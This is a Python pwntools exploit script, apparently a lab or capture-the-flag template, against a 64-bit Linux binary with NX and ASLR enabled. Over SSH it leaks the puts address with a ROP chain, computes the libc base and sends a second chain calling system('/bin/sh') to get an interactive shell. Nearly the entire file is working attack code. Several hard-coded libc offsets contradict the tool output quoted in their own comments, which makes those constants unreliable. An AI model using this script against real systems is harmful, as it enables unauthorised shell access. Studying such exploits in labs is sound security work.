#!/usr/bin/env python3
# Linux Buffer Overflow 64 bits ASLR & NX Enabled
# Tunneling with ssh

# Checksec

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# /proc/sys/kernel/randomize_va_space 2

from pwn import *

context(os="linux", arch="amd64")
#context(log_level='DEBUG')

shell = ssh('user', '10.10.10.10', password='password', port=22)
r = shell.run('/home/user/pwn')

junk = b"A"*56

pop_rdi  = p64(0x400604) # ropper --file pwn --search "% rdi" # 0x0000000000400604: pop rdi; ret;
puts_got = p64(0x601018) # objdump -D pwn | grep puts ## 601018 <puts@GLIBC_2.2.5>
puts_plt = p64(0x4004b0) # objdump -D pwn | grep puts # call   4004b0 <puts@plt>
main     = p64(0x400624) # objdump -D pwn | grep main # 0000000000400624 <main>:

payload = junk + pop_rdi + puts_got + puts_plt + main

r.recvline()
r.sendline(payload)
r.recvline()
leaked_puts = u64(r.recvline().strip().ljust(8, b"\x00"))

# Collect this information from the victim machine

libc_put = 0x6f690 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts # 441: 0000000000071e30   405 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5

offset = leaked_puts - libc_put

libc_sys = 0x45390 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system # 1467: 0000000000045880    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
libc_sh = 0x18cd57 # strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh # 194882 /bin/sh
libc_exit = 0x3a030 # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep exit # 128: 000000000003a030    21 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.2.5

sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)
exit = p64(offset + libc_exit)

payload = junk + pop_rdi + sh + sys + exit

r.recvline()
r.sendline(payload)
r.recvline()

r.interactive()
